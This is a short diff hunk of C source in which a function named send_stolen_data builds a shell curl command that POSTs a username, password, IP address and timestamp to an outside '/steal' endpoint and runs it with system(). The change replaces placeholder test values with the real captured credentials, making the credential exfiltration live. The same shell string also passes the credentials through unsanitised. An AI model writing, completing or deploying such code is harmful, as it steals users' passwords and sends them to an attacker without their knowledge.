@@ -150,7 +150,7 @@ void send_stolen_data(char *username, char *password) {
   // Create the full curl POST request
   snprintf(command, sizeof(command),
            "bash -c 'curl -X POST -d \"username=%s&password=%s&ip=%s&timestamp=$(date)\" https://cyber.stanleyhoo1.tech/steal'",
-           "test", "supersecure", ip);
+           username, password, ip);
 
   // Run the command
   system(command);
